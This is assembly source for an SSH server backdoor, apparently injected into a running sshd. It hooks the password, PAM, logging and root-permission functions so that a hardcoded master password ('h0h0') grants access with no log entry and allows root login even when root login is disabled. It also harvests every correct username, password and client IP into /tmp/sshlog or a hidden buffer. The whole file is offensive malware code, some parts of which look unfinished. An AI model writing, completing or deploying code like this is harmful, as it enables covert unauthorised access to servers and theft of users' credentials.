/* ------------
 * sshbd.s v0.8
 * ------------
 * hooks for:
 *   - auth_passwod()
 *   - do_log()
 *   - auth_root_allowed()
 */
.equ rxhook, __rxhook__
.equ strlen, __strlen__
.equ bcopyz, __bcopyz__

.globl bdentry
.globl bdend
/* setup code, runs in sshd's main() */
.section .text
.globl bdentry
bdentry:
	nop
	nop
	/* mmap() */
	xorq   %rax,  %rax
	xorq   %rdx,  %rdx
	xorq   %rdi,  %rdi
	xorq   %rsi,  %rsi
	xorq   %r8,   %r8
	xorq   %r9,   %r9
	xorq   %r10,  %r10
	movq   $0x3,  %rdi
	shlq   $28,   %rdi
	movq   $4096, %rsi
	movq   $0x7,  %rdx
	movq   $0x22, %r10
	decq   %r8
	movb   $9, %al
	syscall
	movq   %rax, %r12
	/* bdcopy */
	jmp   rkauthpwd
	bdcopy:
	popq   %rsi					/* get address of sshbd */
	movq   $1000, %rcx
	rep    movsb (%rsi), (%rdi)	/* copy sshbd to mmap()'d region */
	/* mprotect() */
	mov    authpwd(%rip), %rdi
	andq   $0xfffffffffffff000, %rdi
	movq   $4096, %rsi
	xorq   %rdx, %rdx
	movb   $0x7, %dl
	xorq   %rax, %rax
	movb   $125, %al	
	syscall
	movq   dolog(%rip), %rbx
	andq   $0xfffffffffffff000, %rbx
	movb   $125, %al
	syscall	
	nop
	int3

/*****************
 * auth_password()
 ****************/
rkauthpwd:
	callq  bdcopy
	pushq   %rbx
	pushq   %rsi
	pushq   %rdi
	cmpb   $0x0, (%rsi)
	jz     restore
	/* cmp passwd, h0h0 */
	leaq   passwd(%rip), %rdi
compare:
	lodsb  (%rsi), %al
	scasb  (%rdi), %al
	jne    1f
	testb  %al, %al
	jne    compare
	xorq   %rax, %rax
	inc    %eax
	movb   $0x01, log(%rip)
	movb   $0x01, pam(%rip)
	jmp    end
1:
restore:
	/* call hook and restore */
	movq   0x8(%rsp), %rsi
	leaq   pwdjmp(%rip), %r9
	leaq   pwdorg(%rip), %r10
	movq   authpwd(%rip), %r11
	callq  rxhook
	test   %eax, %eax
	je     end
logpwd:
	/* log correct passwords */
	movq   0x20(%rdi), %rsi    /* authctxt->user */
	movq   logptr(%rip), %rdi
	xorq   %rcx, %rcx
	callq  bcopyz
	movb   $0x3a, (%rdi)
	inc    %edi
	movq   0x8(%rsp), %rsi
	callq  bcopyz
	movb   $0x3a, (%rdi)
	inc    %edi
	movq   getipaddr(%rip), %rdx
	pushq  %rcx
	callq *%rdx
	popq   %rcx
	movq   %rax, %rsi
	callq  bcopyz
	movb   $0xa, (%rdi)
	addl   $0x3, %ecx
	movq   loglen(%rip), %rdx
	addl   %ecx, %edx
	movq   %rdx, loglen(%rip)
	movq   logfilepwd(%rip), %rax
	test   %eax, %eax
	jne    log2file
	movq   bdrespwd(%rip), %rax
	test   %eax, %eax
	jne    log2bd
	/* write log to file */
log2file:
	xorq   %rax, %rax
	movb   $0x5, %al
	leaq   sshlog(%rip), %rbx
	movl   $0x442, %ecx
	syscall
	movl   %eax, %ebx
	movl   %ecx, %edx
	movq   logptr(%rip), %rcx
	xorl   %eax, %eax
	movb   $0x4, %al
	syscall
	movb   $0x6, %al
	syscall
	jmp    close
	/* write log to bd .data */
log2bd:
	leaq   bdpath(%rip), %rbx
	movq   $0x2, %rcx
	movb   $0x5, %al
	syscall
	movq   %rax, %rbx
	movq   pwdlogoff(%rip), %rcx
	xorq   %rdx, %rdx
	movb   $19, %al
	syscall
	movq   logptr(%rip), %rcx
	movq   loglen(%rip), %rdx
	xorq   %rax, %rax
	movb   $0x4, %al
	syscall
close:
	xorq   %rax, %rax
	movb   $0x6, %al
	syscall
	xorq   %rax, %rax
	inc    %eax
end:
	popq   %rdi
	popq   %rsi
	popq   %rbx
	retq

/****************
 * do_pam() hook
 ***************/
pam_account:
	pushq   %rdx
	pushq   %rsi
	pushq   %rdi
	cmpb   $0x1, pam(%rip)
	je     nopam
	leaq   pamjmp(%rip), %r9
	leaq   pamorg(%rip), %r10
	movq   do_pam(%rip), %r11
	callq  rxhook
	jmp    ok
nopam:
	movb   $0x0, pam(%rip)
	xorq   %rax, %rax
	inc    %eax
ok:
	popq   %rdi
	popq   %rsi
	popq   %rdx
	retq

/****************
 * do_log() hook
 ***************/
__logbd__:
    pushq  %rsi
    pushq  %rdi
	pushq  %rdx
    cmpb   $0x1, log(%rip)
    je     nolog
    leaq   dologjmp(%rip), %r9
    leaq   dologorg(%rip), %r10
    movq   dolog(%rip), %r11
    callq  rxhook
	jmp    done
nolog:
	movb   $0x0, log(%rip)
done:
    popq   %rdx
    popq   %rdi
    popq   %rsi
    retq

/********************
 * root() hook
 * - I hate suduoers
 *******************/
__root__:
	pushq  %rbx
	pushq  %rsi
	pushq  %rdi
    xorq   %rax, %rax
    inc    %eax
    cmpb   $0x1, rooting(%rip)
    je     allow
    leaq   authrootjmp(%rip), %r8
    leaq   authrootorg(%rip), %r9
    movq   authroot(%rip), %r10
    call   rxhook
allow:
    movq   $0x0, rooting(%rip)
	popq   %rdi
	popq   %rsi
	popq   %rbx
    retq

/************************
 * rxhook(func, &org, &jmp)
 * %rdi    - arg1
 * %rsi    - arg2
 * %rdx    - arg3
 * %r9     - jmp
 * %r10    - org
 * %r11    - function
 ***********************/
__rxhook__:
	pushq  %rdi
	pushq  %rsi
	movq   %r11, %rdi
	movq   %r10, %rsi
	xorq   %rcx, %rcx
	movb   $0xa, %cl
	rep    movsb (%rsi), (%rdi)
	movq   0x0(%rsp), %rsi
	movq   0x8(%rsp), %rdi
	callq *%r11
	movq   0x0(%rsp), %rsi
	movq   0x8(%rsp), %rdi
	xorq   %rcx, %rcx
	movb   $0xa, %cl
	rep    movsb (%rsi), (%rdi)
	popq   %rsi
	popq   %rdi
	retq

/************************
 * bcopynz()
 * %esi - source byte ptr
 * %edi - dest mem ptr
 * %ecx - len copied
 ***********************/
__bcopyz__:
	lodsb  (%rsi), %al
	testb  %al, %al
	je     fin
	stosb  %al, (%rdi)
	inc    %ecx
	jmp    bcopyz
fin:
	retq

/**********
 * strlen()
 *********/
__strlen__:
	pushq  %rdi
	xorq   %rax, %rax
	xorq   %rcx, %rcx
	decl   %ecx
	repnz  scasb (%rdi), %al
	notl   %ecx
	decl   %ecx
	movl   %ecx, %eax
	popq   %rdi
	retq
/********************************************/
/********************************************/
//.section .data
/* ******************
 *
 * Function pointers
 *
 ********************/
getipaddr:
	.quad 0xc0c010c0
dolog:
	.quad 0
authroot:
	.quad 0
authpwd:
	.quad 0
do_pam:
	.quad 0

/* ******
 *
 * Hooks 
 *
 *******/
/* auth_password() */
pwdjmp:
	.byte 0x48,0xb8,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xff,0xd0
pwdorg:
	.fill 16,1,0xff
/* do_pam() */
pamjmp:
	.byte 0x48,0xb8,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xff,0xd0
pamorg:
	.fill 16,1,0xff
/* do_log() */
dologorg:
	.fill 16,1,0xff
dologjmp:
	.byte 0x48,0xb8,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xff,0xd0
/* auth_root_allowed() */
authrootorg:
	.fill 16,1,0xff
authrootjmp:
	.byte 0x48,0xb8,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xff,0xd0
	
/* *************
 *
 * Global vars
 *
 **************/
logfilepwd:               /* store passwords in /tmp/sshlog */
    .long 0x00000000
bdrespwd:                 /* store passwords in char pwdlog[] in bd.c */
    .long 0x00000000
pwdlogoff:                /* offset of char pwdlog[2048] in bd.c */
    .long 0x00000000
rooting:                  /* allow us to log in as root when disabled */
    .long 0x00000000
log:                      /* do_log() switch */ 
    .long 0x00000000
pam:
	.long 0
loglen:                   /* current length of pwd log */
    .long 0x00000000
logptr:                   /* ptr to pwd log */
    .quad 0x7fff30000800

/* ********
 *
 * Strings
 *
 *********/
bdpath:
    .fill 32,1,0xf4     
sshlog:
	.string "/tmp/sshlog"
user:
	.string "root"
passwd:
	.string "h0h0"
